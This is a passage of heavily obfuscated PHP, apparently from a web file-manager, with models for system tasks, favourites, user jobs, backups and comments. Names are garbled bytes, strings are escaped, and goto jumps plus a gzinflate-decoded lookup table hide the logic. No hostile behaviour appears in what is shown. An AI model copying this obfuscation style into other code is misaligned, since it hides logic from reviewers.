$óäüŠ¬->pathParse[$ŞˆÛ­º[1209]]; } else { $ùøí®ıè = $ù¢ˆ¸à—; } $²ğÔÇô = IO::copyMove($´Ç‡ÔÑ, $ùøí®ıè, $—Ë¿¿¦Ò, $Ãô¦î¸í, $À¿³ØÉ—); $²ğÔÇô = $this->getPathOuter($²ğÔÇô); return $²ğÔÇô; } public function pathThis($¸½™›‚ª) { return get_path_this($this->pathParse[$_SERVER[íû‘ş´][84]]); } public function pathFather($Çìé…ù) { return get_path_father($this->pathParse[$_SERVER[íû‘ş´][84]]); } public function iconvSystem($æ®Áµ¹¤) { return $æ®Áµ¹¤; } protected function infoParse($àµú©‚è, $ñü½ÒÈœ = false) { $œ¼¡ó‰Ó =& $_SERVER[íû‘ş´]; $Ù†¦›ÎÅ = $this->pathParse[$œ¼¡ó‰Ó[538]][$œ¼¡ó‰Ó[1233]] . $this->pathParse[$œ¼¡ó‰Ó[1226]]; if ($ñü½ÒÈœ) { $íÈë¤  = IO::infoWithChildren($Ù†¦›ÎÅ); } else { $íÈë¤  = IO::info($Ù†¦›ÎÅ); } $´Ç†ûöÉ = $this->pathParse[$œ¼¡ó‰Ó[538]]; return Action($œ¼¡ó‰Ó[1397])->_shareItemeParse($íÈë¤ , $´Ç†ûöÉ); } public function listAll($µ¬­‚èµ) { $•Ï§÷©‰ =& $_SERVER[íû‘ş´]; $ÄËù = IO::listAll($µ¬­‚èµ); $Ô˜²çœé = rtrim($this->pathParse[$•Ï§÷©‰[538]][$•Ï§÷©‰[1233]], $•Ï§÷©‰[8]); foreach ($ÄËù as &$Ö¨¿Œ§Ï) { $Ö¨¿Œ§Ï[$•Ï§÷©‰[84]] = $this->pathDriver . $•Ï§÷©‰[8] . ltrim(substr($Ö¨¿Œ§Ï[$•Ï§÷©‰[84]], strlen($Ô˜²çœé)), $•Ï§÷©‰[8]); } unset($Ö¨¿Œ§Ï); return $ÄËù; } public function listAllSimple($İ¹ŒÄ€ñ, $õ·Í¢öÆ = false) { $«ıÀø =& $_SERVER[íû‘ş´]; $¹¬ÑÓ­¹ = $this->listAll($İ¹ŒÄ€ñ); $¦›ÒªÆ = $this->pathParse[$«ıÀø[472]]; if (trim($¦›ÒªÆ, $«ıÀø[8]) == trim(get_path_father($¦›ÒªÆ), $«ıÀø[8])) { $õ·Í¢öÆ = !0; } return IO::init($«ıÀø[12])->listAllSimpleMake($¹¬ÑÓ­¹, $¦›ÒªÆ, $õ·Í¢öÆ); } public function getPathOuter($îÄ¼°öÃ) { $µ·Ñ“î¢ =& $_SERVER[íû‘ş´]; $°‰¬ÉÑ = KodIO::parse($îÄ¼°öÃ); if ($°‰¬ÉÑ[$µ·Ñ“î¢[33]] == KodIO::KOD_SHARE_ITEM) { return $°‰¬ÉÑ[$µ·Ñ“î¢[84]]; } $Ÿ•»’éÛ = KodIO::clear($îÄ¼°öÃ); $ìØ‹»ßÙ = KodIO::clear($this->pathParse[$µ·Ñ“î¢[538]][$µ·Ñ“î¢[1233]]); $¨Ñ¸’ı = substr($Ÿ•»’éÛ, strlen($ìØ‹»ßÙ)); if (substr($Ÿ•»’éÛ, 0, strlen($ìØ‹»ßÙ)) != $ìØ‹»ßÙ) { return !1; } return $this->pathParse[$µ·Ñ“î¢[1227]] . $µ·Ñ“î¢[8] . ltrim($¨Ñ¸’ı, $µ·Ñ“î¢[8]); } public function getType() { $Â˜×‰ãÓ =& $_SERVER[íû‘ş´]; $¶øÙÆÕ© = str_replace($Â˜×‰ãÓ[74], $Â˜×‰ãÓ[12], get_class($this)); return strtolower($¶øÙÆÕ©); } public function isTypeObject($½Ù—ıŠ˜) { return IO::isTypeObject($½Ù—ıŠ˜); } public function info($¸à–ôŒ©) { return $this->infoParse($¸à–ôŒ©); } public function infoAuth($š©ÕĞÚò) { return $this->infoParse($š©ÕĞÚò); } public function infoWithChildren($ÇÁ²ê„Ä) { return $this->infoParse($ÇÁ²ê„Ä, !0); } public function infoFull($ãÌ…÷Ô) { return $this->infoParse($ãÌ…÷Ô); } } goto cæ‘¸¿Ù‘ï; D‚ã¥ïö»: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\x2e\164\141\163\x6b\114\151\163\x74"; public $field = array("\156\x61\155\x65", "\164\x79\x70\145", "\x65\166\x65\156\x74", "\x74\x69\155\x65", "\x64\145\x73\143", "\163\171\163\164\x65\x6d", "\x65\156\x61\142\x6c\x65", "\154\141\x73\164\x52\x75\156", "\163\x6f\x72\164"); public function listData($ç‰Ê§Íê = false, $õá­Ï = "\x73\157\x72\164", $Î…ÚÇèÎ = false) { return parent::listData($ç‰Ê§Íê, $õá­Ï, $Î…ÚÇèÎ); } public function add($ªíì“ŒÔ) { $÷™¤ÅêÎ =& $_SERVER[íû‘ş´]; $µ¸ïÉà = $this->findByName($ªíì“ŒÔ[$÷™¤ÅêÎ[32]]); if ($µ¸ïÉà) { return !1; } $ªíì“ŒÔ[$÷™¤ÅêÎ[1662]] = 0; $ªíì“ŒÔ[$÷™¤ÅêÎ[1927]] = $this->getSort(); return parent::insert($ªíì“ŒÔ); } private function getSort() { $ûšç÷¨ =& $_SERVER[íû‘ş´]; $Óµ‘€Œ = parent::listData(); $Ÿ¸Ã™œ  = array_to_keyvalue($Óµ‘€Œ, $ûšç÷¨[12], $ûšç÷¨[1927]); return empty($Ÿ¸Ã™œ ) ? 0 : max($Ÿ¸Ã™œ ) + 1; } public function update($“Å‘®«ñ, $à€ïôõ˜) { $Ì·•ú• =& $_SERVER[íû‘ş´]; $ï³ÎİÌ = $this->listData($“Å‘®«ñ); $’˜ÙÒ€ê = $this->findByName($à€ïôõ˜[$Ì·•ú•[32]]); if (!$ï³ÎİÌ || $’˜ÙÒ€ê && $’˜ÙÒ€ê[$Ì·•ú•[443]] != $ï³ÎİÌ[$Ì·•ú•[443]]) { return !1; } return parent::update($“Å‘®«ñ, $à€ïôõ˜); } public function remove($îÕšãĞ, $ëØ¾À”á = false) { $İ¹„ÚÓ” =& $_SERVER[íû‘ş´]; $”ã˜£„ñ = $this->listData($îÕšãĞ); if (!$”ã˜£„ñ) { return; } if (!$ëØ¾À”á && $”ã˜£„ñ[$İ¹„ÚÓ”[179]] == $İ¹„ÚÓ”[88]) { return !1; } return parent::remove($îÕšãĞ); } public function enable($§ÆÁû¤, $îò‚¢á€) { return $this->update($§ÆÁû¤, array($_SERVER[íû‘ş´][2339] => $îò‚¢á€)); } public function run($™È™º“) { return $this->update($™È™º“, array($_SERVER[íû‘ş´][2351] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\137\146\141\166"; protected function cacheFunctionAlias($Ë¯ÅŒæŠ) { $›å›ÊƒÌ =& $_SERVER[íû‘ş´]; return array($›å›ÊƒÌ[2014] => array(USER_ID, $›å›ÊƒÌ[2352])); } protected function listData() { $ğ°‘ú„­ =& $_SERVER[íû‘ş´]; $œßá»ÁÄ = array($ğ°‘ú„­[1696] => USER_ID, $ğ°‘ú„­[535] => 0); $‡¼¿Õ¤ä = $ğ°‘ú„­[2353]; $˜Ç½¹ô = $this->field($‡¼¿Õ¤ä)->where($œßá»ÁÄ)->order($ğ°‘ú„­[2354])->select(); return $˜Ç½¹ô ? $˜Ç½¹ô : array(); } protected function resetCache() { } protected function listView() { $˜ü‡Îä =& $_SERVER[íû‘ş´]; $åÇ åŞ = $this->listData(); $ú¡ºå›ü = array_filter_by_field($åÇ åŞ, $˜ü‡Îä[33], $˜ü‡Îä[467]); $„©áÖ = array_to_keyvalue($ú¡ºå›ü, $˜ü‡Îä[12], $˜ü‡Îä[84]); if (!$„©áÖ) { return $åÇ åŞ; } $•§™ÄÙ = 2000; $ã«öî‡Ü = array($˜ü‡Îä[468] => array($˜ü‡Îä[469], $„©áÖ)); $°ª¸Æş® = Model($˜ü‡Îä[884])->listSource($ã«öî‡Ü, $•§™ÄÙ); $°ª¸Æş® = array_merge($°ª¸Æş®[$˜ü‡Îä[83]], $°ª¸Æş®[$˜ü‡Îä[82]]); $°ª¸Æş® = array_to_keyvalue($°ª¸Æş®, $˜ü‡Îä[181]); foreach ($åÇ åŞ as $„»¾½Í¤ => $–Û¸¥Åˆ) { $Ï‹—–§é = $°ª¸Æş®[$–Û¸¥Åˆ[$˜ü‡Îä[84]]]; $Ï‹—–§é = $Ï‹—–§é ? $Ï‹—–§é : array(); $åÇ åŞ[$„»¾½Í¤] = array_merge($Ï‹—–§é, $–Û¸¥Åˆ); } return $åÇ åŞ; } protected function addFav($€ªÓÎüş, $–Ü°¯´Ù = '', $ö”ÜÛèÇ = "\163\157\165\x72\x63\145") { $³Šãà›ê =& $_SERVER[íû‘ş´]; $® ËÛ² = array($³Šãà›ê[1696] => USER_ID, $³Šãà›ê[535] => 0, $³Šãà›ê[473] => $ö”ÜÛèÇ, $³Šãà›ê[472] => $€ªÓÎüş); if ($this->where($® ËÛ²)->find()) { return !1; } $® ËÛ² = array($³Šãà›ê[1696] => USER_ID, $³Šãà›ê[535] => 0); $Ç†–‹úÇ = $this->where($® ËÛ²)->max($³Šãà›ê[1927]); if (!$Ç†–‹úÇ) { $Ç†–‹úÇ = 0; } if (!$–Ü°¯´Ù && $ö”ÜÛèÇ == $³Šãà›ê[467]) { $†ˆ˜ßÇĞ = Model($³Šãà›ê[1390])->where(array($³Šãà›ê[468] => $€ªÓÎüş))->find(); if (!$†ˆ˜ßÇĞ) { return !1; } $–Ü°¯´Ù = $†ˆ˜ßÇĞ[$³Šãà›ê[32]]; } $–Ü°¯´Ù = $this->getAutoName($–Ü°¯´Ù); $Ä­Óªó¼ = array($³Šãà›ê[1696] => USER_ID, $³Šãà›ê[535] => 0, $³Šãà›ê[471] => $–Ü°¯´Ù, $³Šãà›ê[472] => $€ªÓÎüş, $³Šãà›ê[473] => $ö”ÜÛèÇ, $³Šãà›ê[1907] => $Ç†–‹úÇ + 1); return $this->add($Ä­Óªó¼); } protected function remove($ÙÒ›õ¤û) { $£ªğ£À =& $_SERVER[íû‘ş´]; $ö·ºÖŞ = array($£ªğ£À[1696] => USER_ID, $£ªğ£À[470] => $ÙÒ›õ¤û); return $this->where($ö·ºÖŞ)->delete(); } protected function removeByName($Â²ŒÂ´Æ) { $ÕÙó‰ü» =& $_SERVER[íû‘ş´]; $Úû“¸è£ = array($ÕÙó‰ü»[1696] => USER_ID, $ÕÙó‰ü»[471] => $Â²ŒÂ´Æ, $ÕÙó‰ü»[535] => 0); return $this->where($Úû“¸è£)->delete(); } protected function rename($Ğú×¬Ó, $’áˆıË) { $ÖŞ˜¨¸ó =& $_SERVER[íû‘ş´]; if ($Ğú×¬Ó == $’áˆıË) { return !1; } $ÚÇìßÕó = $this->getAutoName($’áˆıË); if ($’áˆıË != $ÚÇìßÕó) { return !1; } $óÑïß´ = array($ÖŞ˜¨¸ó[1696] => USER_ID, $ÖŞ˜¨¸ó[535] => 0, $ÖŞ˜¨¸ó[32] => $Ğú×¬Ó); return $this->where($óÑïß´)->save(array($ÖŞ˜¨¸ó[32] => $’áˆıË)); } protected function resetSort($ÎæÁä—€) { $¹üâëÕ• =& $_SERVER[íû‘ş´]; $ÎæÁä—€ = is_array($ÎæÁä—€) ? $ÎæÁä—€ : array(); $ÔÈ§¶éİ = array($¹üâëÕ•[1696] => USER_ID); for ($¡ş±úË† = 0; $¡ş±úË† < count($ÎæÁä—€); $¡ş±úË†++) { $ÔÈ§¶éİ[$¹üâëÕ•[470]] = $ÎæÁä—€[$¡ş±úË†]; $this->where($ÔÈ§¶éİ)->save(array($¹üâëÕ•[1907] => $¡ş±úË† + 1)); } return !0; } protected function moveTop($×›) { $üõ¨ñà =& $_SERVER[íû‘ş´]; $­‹ø±®– = array($üõ¨ñà[1696] => USER_ID, $üõ¨ñà[535] => 0); $¢å¹»§ë = $this->where($­‹ø±®–)->where(array($üõ¨ñà[32] => $×›))->find(); if (!$¢å¹»§ë) { return; } $Ñ×ÉçÉü = $this->field($üõ¨ñà[443])->where($­‹ø±®–)->order($üõ¨ñà[2354])->select(); $Ñ×ÉçÉü = array_to_keyvalue($Ñ×ÉçÉü, $üõ¨ñà[12], $üõ¨ñà[443]); $™«•ÎÃò = $Ñ×ÉçÉü; $Ñ×ÉçÉü = array_remove_value($Ñ×ÉçÉü, $¢å¹»§ë[$üõ¨ñà[443]]); array_unshift($Ñ×ÉçÉü, $¢å¹»§ë[$üõ¨ñà[443]]); return $this->resetSort($Ñ×ÉçÉü); } protected function moveBottom($Ê¿ïÕÎö) { $ğÁªå±Â =& $_SERVER[íû‘ş´]; $Ó˜¡£ì¨ = array($ğÁªå±Â[1696] => USER_ID, $ğÁªå±Â[535] => 0); $‰¤³ÜÔ = $this->where($Ó˜¡£ì¨)->max($ğÁªå±Â[1927]); $Ç‹ô·„ = array($ğÁªå±Â[1927] => $‰¤³ÜÔ + 1); return $this->where($Ó˜¡£ì¨)->where(array($ğÁªå±Â[32] => $Ê¿ïÕÎö))->save($Ç‹ô·„); } private function getAutoName($Ù¾Şú×í) { $Éİ¹’ÙÏ =& $_SERVER[íû‘ş´]; $å˜ªË© = array($Éİ¹’ÙÏ[1696] => USER_ID, $Éİ¹’ÙÏ[535] => 0); $õÌ¶ŠÑ® = $this->field($Éİ¹’ÙÏ[32])->where($å˜ªË©)->select(); $õÌ¶ŠÑ® = array_to_keyvalue($õÌ¶ŠÑ®, $Éİ¹’ÙÏ[12], $Éİ¹’ÙÏ[32]); if (!$õÌ¶ŠÑ® || !in_array($Ù¾Şú×í, $õÌ¶ŠÑ®)) { return $Ù¾Şú×í; } for ($á’ˆß¹ï = 0; $á’ˆß¹ï < count($õÌ¶ŠÑ®); $á’ˆß¹ï++) { if (!in_array($Ù¾Şú×í . "\x28{$á’ˆß¹ï}\x29", $õÌ¶ŠÑ®)) { return $Ù¾Şú×í . "\50{$á’ˆß¹ï}\51"; } } return $Ù¾Şú×í . "\x28{$á’ˆß¹ï}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\x2e\x6a\157\x62\114\x69\x73\x74"; public $field = array("\156\x61\x6d\x65", "\x64\x65\163\x63", "\x73\157\x72\164"); const JOB_KEY = "\163\x65\x6c\146\112\x6f\x62\114\151\x73\164"; public function listData($ÔÛ”›²» = false, $…¤„ïÇÜ = "\163\157\162\164", $›æØ½ˆã = false) { return parent::listData($ÔÛ”›²», $…¤„ïÇÜ, $›æØ½ˆã); } public function remove($£º¿ÂœÏ) { return parent::remove($£º¿ÂœÏ); } public function add($€–÷çì¼) { $Ö©‰øòÄ =& $_SERVER[íû‘ş´]; if ($this->findByName($€–÷çì¼[$Ö©‰øòÄ[32]])) { return !1; } $€–÷çì¼[$Ö©‰øòÄ[1927]] = $this->getSort(); return parent::insert($€–÷çì¼); } private function getSort() { $´î§ÁöÀ =& $_SERVER[íû‘ş´]; $İ•×Ø÷ä = parent::listData(); $”äøú”ö = array_to_keyvalue($İ•×Ø÷ä, $´î§ÁöÀ[12], $´î§ÁöÀ[1927]); return empty($”äøú”ö) ? 0 : max($”äøú”ö) + 1; } public function update($€ĞÂË¡ò, $ŠèŞÆ×œ) { $¯Òå×ñ¬ =& $_SERVER[íû‘ş´]; $äÜÅ˜£Ñ = parent::listData($€ĞÂË¡ò); $ ¶úÚ“î = $this->findByName($ŠèŞÆ×œ[$¯Òå×ñ¬[32]]); if (!$äÜÅ˜£Ñ || $ ¶úÚ“î && $ ¶úÚ“î[$¯Òå×ñ¬[443]] != $äÜÅ˜£Ñ[$¯Òå×ñ¬[443]]) { return !1; } return parent::update($€ĞÂË¡ò, $ŠèŞÆ×œ); } public function setUserJob($ÇşŒ¸İŒ, $ÑµœÒˆî) { $›±öÇÏç =& $_SERVER[íû‘ş´]; if (!is_array($ÑµœÒˆî)) { $ÑµœÒˆî = array($ÑµœÒˆî); } $ĞÆ°Ãê© = parent::listData(); $¾Çİ–ıã = array_to_keyvalue($ĞÆ°Ãê©, $›±öÇÏç[32]); $ŠÈøúê = $›±öÇÏç[422]; foreach ($ÑµœÒˆî as $Ë³ÆşÛ¶) { if ($¾Çİ–ıã[$Ë³ÆşÛ¶]) { $ŠÈøúê .= $¾Çİ–ıã[$Ë³ÆşÛ¶][$›±öÇÏç[443]] . $›±öÇÏç[50]; } else { $„ñŠ…Œ‡ = $this->add($Ë³ÆşÛ¶); $ŠÈøúê .= $„ñŠ…Œ‡ . $›±öÇÏç[50]; } } $ŠÈøúê = rtrim($ŠÈøúê, $›±öÇÏç[50]); Model($›±öÇÏç[577])->metaSet($ÇşŒ¸İŒ, self::JOB_KEY, $ŠÈøúê); } public function getUserJob($µ´ÀÔÏÔ) { $Ÿî“äüË = Model($_SERVER[íû‘ş´][577])->metaGet($µ´ÀÔÏÔ); return $this->getUserJobInfo($Ÿî“äüË[self::JOB_KEY]); } public function getUserJobInfo($²³õÙ£) { $ÎÜÖÔï¨ =& $_SERVER[íû‘ş´]; $Ÿ§¥¼‰Œ = explode($ÎÜÖÔï¨[50], $²³õÙ£); $ç´²‘áÎ = parent::listData(); $ç´²‘áÎ = array_remove_key($ç´²‘áÎ, $ÎÜÖÔï¨[215]); $ˆàÊˆÇû = array(); foreach ($Ÿ§¥¼‰Œ as $ë€Š®é) { if (isset($ç´²‘áÎ[$ë€Š®é])) { $ˆàÊˆÇû[] = $ç´²‘áÎ[$ë€Š®é]; } } return $ˆàÊˆÇû; } } goto e†—­Õ¼¤; Eï¹¶ö¢‚†: if (!$xnvozlyuth) { die; } $_SERVER[¹£Ÿ×Òˆ] = explode($_SERVER[íû‘ş´][658], gzinflate(substr($_SERVER[íû‘ş´][659], 10, -8))); $izylfohcqv = $_SERVER[íû‘ş´][660]; goto C¼ËèÛŒÉ; c¦…¶Ñƒ : define($_SERVER[íû‘ş´][0], $_SERVER[íû‘ş´][1]); $_SERVER[‡‚«ºˆÅ] = explode($_SERVER[íû‘ş´][2], gzinflate(substr($_SERVER[íû‘ş´][3], 10, -8))); function binCheckEq($¦Š¥€Æ«, $äÅ—å»õ) { return $¦Š¥€Æ« == $äÅ—å»õ; } goto Fó’¿¸”æô; e­Ø¼¸‰Î¡: define($_SERVER[íû‘ş´][282], 1); define($_SERVER[íû‘ş´][283], 2); define($_SERVER[íû‘ş´][284], 3); goto DßÃÎ£µ˜; F ‹»ğÖ‚‚: class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\x2e\x62\x61\143\153\x75\x70\x4c\x69\x73\164"; public $field = array("\151\x6f", "\156\x61\x6d\145", "\x73\164\x61\x74\x75\x73", "\143\x6f\x6e\x74\x65\x6e\164", "\x6d\x61\x6e\165\x61\154", "\x72\145\x73\165\x6c\164", "\x74\x69\155\x65\x46\x72\x6f\155", "\x74\151\155\145\x54\x6f"); public function config() { $Öóû–Üû =& $_SERVER[íû‘ş´]; $¢²üÁ¼ = Model($Öóû–Üû[829])->get($Öóû–Üû[839]); $¢²üÁ¼ = json_decode($¢²üÁ¼, !0); $¢²üÁ¼ = is_array($¢²üÁ¼) ? $¢²üÁ¼ : array(); if (!isset($¢²üÁ¼[$Öóû–Üû[813]])) { $¢²üÁ¼[$Öóû–Üû[813]] = $Öóû–Üû[88]; } unset($¢²üÁ¼[$Öóû–Üû[1675]]); Action($Öóû–Üû[1928])->taskInit(); Model($Öóû–Üû[1674])->cacheClear(); $·ğé¾–â = $Öóû–Üû[1929]; $ìÚÈÆ÷ = Model($Öóû–Üû[1930])->findByKey($Öóû–Üû[1693], $·ğé¾–â); if (!$ìÚÈÆ÷) { $ìÚÈÆ÷ = array(); } if (isset($ìÚÈÆ÷[$Öóû–Üû[194]])) { $ìÚÈÆ÷[$Öóû–Üû[194]] = json_decode($ìÚÈÆ÷[$Öóû–Üû[194]], !0); } if (isset($¢²üÁ¼[$Öóû–Üû[194]])) { $ìÚÈÆ÷[$Öóû–Üû[194]][$Öóû–Üû[1678]] = $¢²üÁ¼[$Öóû–Üû[194]]; unset($¢²üÁ¼[$Öóû–Üû[194]]); } return array_merge($ìÚÈÆ÷, $¢²üÁ¼); } public function listData($ä”ÄÚ«‹ = false, $ñÚˆÏØ¢ = "\x6d\x6f\144\x69\x66\171\124\x69\155\145", $ËÀÛ±Îß = false) { return parent::listData($ä”ÄÚ«‹, $ñÚˆÏØ¢, !0); } public function lastItem() { $¼ä±·Ú¤ = $this->listData(); return !empty($¼ä±·Ú¤[0]) ? $¼ä±·Ú¤[0] : null; } public function kill($ôä•ë’Û) { $°ê³Æù =& $_SERVER[íû‘ş´]; $Åº­Ö•Ş = $this->listData($ôä•ë’Û); if (!$Åº­Ö•Ş || empty($Åº­Ö•Ş[$°ê³Æù[32]])) { return !0; } Task::kill($°ê³Æù[838]); Task::kill($°ê³Æù[859]); Task::kill($°ê³Æù[868]); $º¾‚Ùœí = $Åº­Ö•Ş[$°ê³Æù[32]]; $ÙªÜÙ¡· = TEMP_FILES . $°ê³Æù[837] . $º¾‚Ùœí . $°ê³Æù[8]; IO::remove($ÙªÜÙ¡·, !1); return $this->remove($ôä•ë’Û); } public function remove($³‘Ù¸Ë·) { $§“–ÖĞù = $this->listData($³‘Ù¸Ë·); if (!$§“–ÖĞù) { return !0; } return $this->backupRemove($§“–ÖĞù); } private function backupRemove($¿°Òª€—) { parent::remove($¿°Òª€—[$_SERVER[íû‘ş´][443]]); $”Õğ‹¥¢ = $this->backupPath($¿°Òª€—); IO::remove($”Õğ‹¥¢, !1); return !0; } private function backupPath($­ƒ»µ–™) { $Ç–¶±‚– =& $_SERVER[íû‘ş´]; $“ÖäÛ = $­ƒ»µ–™[$Ç–¶±‚–[32]]; $¾Â×ö‘¯ = Model($Ç–¶±‚–[829])->get($Ç–¶±‚–[830]); $³ğâĞàá = substr(md5($Ç–¶±‚–[831] . $¾Â×ö‘¯ . $“ÖäÛ), 0, 8); return "\x7b\x69\157\72{$­ƒ»µ–™[$Ç–¶±‚–[810]]}\175\x2f\144\x61\x74\x61\x62\141\163\145\57\x62\141\x63\153\x75\x70\57" . $“ÖäÛ . $Ç–¶±‚–[11] . $³ğâĞàá; } public function start() { $òıÚ¤©Ä =& $_SERVER[íû‘ş´]; if ($GLOBALS[$òıÚ¤©Ä[6]][$òıÚ¤©Ä[89]][$òıÚ¤©Ä[1931]] != $òıÚ¤©Ä[88]) { return !0; } $†‰•õŒÓ = $this->config(); if (!$†‰•õŒÓ || $†‰•õŒÓ[$òıÚ¤©Ä[1675]] != $òıÚ¤©Ä[88]) { return !1; } $÷Ÿæ‚ğ = $this->process(); foreach ($÷Ÿæ‚ğ as $Ä¢Ì«˜ƒ) { if ($Ä¢Ì«˜ƒ) { return Task::restart($Ä¢Ì«˜ƒ[$òıÚ¤©Ä[443]]); } } $ä’š’†ö = new Backup(); $„¢ğ¼ = $ä’š’†ö->db(); if ($„¢ğ¼) { $„¢ğ¼ = $ä’š’†ö->dbFile(); if ($„¢ğ¼ && $†‰•õŒÓ[$òıÚ¤©Ä[813]] == $òıÚ¤©Ä[212]) { $„¢ğ¼ = $ä’š’†ö->file(); } } Backup::set(array($òıÚ¤©Ä[809] => 1, $òıÚ¤©Ä[820] => time())); return !0; } public function process() { $•”Œ­÷ =& $_SERVER[íû‘ş´]; $Øıô­õ¿ = array($•”Œ­÷[816] => Task::get($•”Œ­÷[838]), $•”Œ­÷[821] => Task::get($•”Œ­÷[859]), $•”Œ­÷[214] => Task::get($•”Œ­÷[868])); $è¾‘ö™ƒ = !1; foreach ($Øıô­õ¿ as &$ï˜ìÑ™) { if ($è¾‘ö™ƒ) { $ï˜ìÑ™ = !1; continue; } if ($ï˜ìÑ™) { $¡»ÊµØî = intval(_get($ï˜ìÑ™, $•”Œ­÷[1710], 0)); if (time() - $¡»ÊµØî > 7200) { Task::kill($ï˜ìÑ™[$•”Œ­÷[443]]); $è¾‘ö™ƒ = !0; $ï˜ìÑ™ = !1; } } } return $Øıô­õ¿; } public function restore() { $ˆ¤ŸÛò˜ =& $_SERVER[íû‘ş´]; ActionCall($ˆ¤ŸÛò˜[1118], !0, 1); ActionCall($ˆ¤ŸÛò˜[1118], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\x6d\145\156\x74"; protected $tableMeta = array("\164\x61\x62\154\x65\116\141\155\145" => "\x63\157\155\155\145\x6e\x74\x5f\155\145\164\141", "\155\x65\x74\141\x46\151\x65\154\x64" => "\143\157\155\x6d\x65\x6e\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($İ– °Ë) { $ÃÇì¯Ç° =& $_SERVER[íû‘ş´]; if ($İ– °Ë[$ÃÇì¯Ç°[1932]]) { $œ‹à‹õ½ = $this->where(array($ÃÇì¯Ç°[1933] => $İ– °Ë[$ÃÇì¯Ç°[1932]]))->find(); if (!$œ‹à‹õ½ || $œ‹à‹õ½[$ÃÇì¯Ç°[178]] != $İ– °Ë[$ÃÇì¯Ç°[178]] || $œ‹à‹õ½[$ÃÇì¯Ç°[548]] != $İ– °Ë[$ÃÇì¯Ç°[548]]) { return !1; } $this->where(array($ÃÇì¯Ç°[1933] => $İ– °Ë[$ÃÇì¯Ç°[1932]]))->setAdd($ÃÇì¯Ç°[1934], 1); } $İ– °Ë[$ÃÇì¯Ç°[1935]] = 0; $İ– °Ë[$ÃÇì¯Ç°[1934]] = 0; $İ– °Ë[$ÃÇì¯Ç°[809]] = 1; return $this->add($İ– °Ë); } public function commentCount($¤»°˜¹€, $É›™«œ, $’Ö‚õ„´ = false) { $ê‘ê ÏÍ =& $_SERVER[íû‘ş´]; if (!$¤»°˜¹€) { return array(); } if (is_string($¤»°˜¹€) || is_int($¤»°˜¹€)) { $¤»°˜¹€ = array($¤»°˜¹€); } $Úİ‚üİ = array($ê‘ê ÏÍ[548], $ê‘ê ÏÍ[1936] => $ê‘ê ÏÍ[543]); $ºÍÄĞ¾š = array($ê‘ê ÏÍ[548] => array($ê‘ê ÏÍ[7], $¤»°˜¹€), $ê‘ê ÏÍ[178] => $É›™«œ); if ($’Ö‚õ„´) { $ºÍÄĞ¾š[$ê‘ê ÏÍ[1705]] = $’Ö‚õ„´; } $š“š‚à¿ = $this->field($Úİ‚üİ)->where($ºÍÄĞ¾š)->group($ê‘ê ÏÍ[548])->select(); return array_to_keyvalue($š“š‚à¿, $ê‘ê ÏÍ[548], $ê‘ê ÏÍ[543]); } public function starTarget($ÌİÁÙÍ, $®­ºŸ€) { $½‹¼Çä =& $_SERVER[íû‘ş´]; $¸Ó·«Ù© = $ÌİÁÙÍ + self::TYPE_STAR_OFFSET; $“Œªã = array($½‹¼Çä[1705] => USER_ID, $½‹¼Çä[178] => $¸Ó·«Ù©, $½‹¼Çä[548] => $®­ºŸ€); $±¹ºòŠ = $this->where($“Œªã)->find(); if ($±¹ºòŠ) { return $this->where(array($½‹¼Çä[443] => $±¹ºòŠ[$½‹¼Çä[443]]))->delete(); } $×Õçï¡¿ = array($½‹¼Çä[1932] => 0, $½‹¼Çä[1705] => USER_ID, $½‹¼Çä[809] => 1, $½‹¼Çä[813] => $½‹¼Çä[12], $½‹¼Çä[178] => $¸Ó·«Ù©, $½‹¼Çä[548] => $®­ºŸ€, $½‹¼Çä[1935] => 0, $½‹¼Çä[1934] => 0); return $this->add($×Õçï¡¿); } public function starTargetCount($Á“¡µš, $ÀÅö®Â¥) { $—ãª×› =& $_SERVER[íû‘ş´]; $êÅ™Çà± = $ÀÅö®Â¥ + self::TYPE_STAR_OFFSET; $Ù–ÊÊç  = $this->commentCount($Á“¡µš, $êÅ™Çà±); $Ü¬Çœôº = $this->commentCount($Á“¡µš, $êÅ™Çà±, USER_ID); return array($—ãª×›[1937] => $Ù–ÊÊç , $—ãª×›[1938] => $Ü¬Çœôº); } public function starTargetUserList($®¾¸Š¢Ô, $åà¤ıç) { $ıı­‚õé =& $_SERVER[íû‘ş´]; $¦ƒ±ğº÷ = $®¾¸Š¢Ô + self::TYPE_STAR_OFFSET; $à“ïğÇ = array($ıı­‚õé[548] => $åà¤ıç, $ıı­‚õé[178] => $¦ƒ±ğº÷); $©šº¡ã = $this->where($à“ïğÇ)->count(); $˜ÆñÀ—º = array($ıı­‚õé[299] => $©šº¡ã, $ıı­‚õé[1939] => array()); if (!$©šº¡ã) { return $˜ÆñÀ—º; } $Ÿû•ÜŒ… = $this->field($ıı­‚õé[1705])->where($à“ïğÇ)->limit(500)->select(); $Ÿû•ÜŒ… = array_to_keyvalue($Ÿû•ÜŒ…, $ıı­‚õé[12], $ıı­‚õé[1705]); $˜ÆñÀ—º[$ıı­‚õé[1939]] = Model($ıı­‚õé[556])->userListInfo($Ÿû•ÜŒ…); return $˜ÆñÀ—º; } public function prasiseUserList($’øä¢Ãø) { $¬á™Í­Û =& $_SERVER[íû‘ş´]; $ºÔÕÁß = array($¬á™Í­Û[1940] => $’øä¢Ãø); $±÷’é– = $this->where($ºÔÕÁß)->find(); $‘¬°ÂÕæ = _get($±÷’é–, $¬á™Í­Û[1935], 0); $Ï¦êÎ = array($¬á™Í­Û[299] => $‘¬°ÂÕæ, $¬á™Í­Û[1939] => array()); if (!$‘¬°ÂÕæ) { return $Ï¦êÎ; } $¬ áí¢ƒ = Model($¬á™Í­Û[1941])->field($¬á™Í­Û[1705])->where($ºÔÕÁß)->limit(500)->select(); $¬ áí¢ƒ = array_to_keyvalue($¬ áí¢ƒ, $¬á™Í­Û[12], $¬á™Í­Û[1705]); $Ï¦êÎ[$¬á™Í­Û[1939]] = 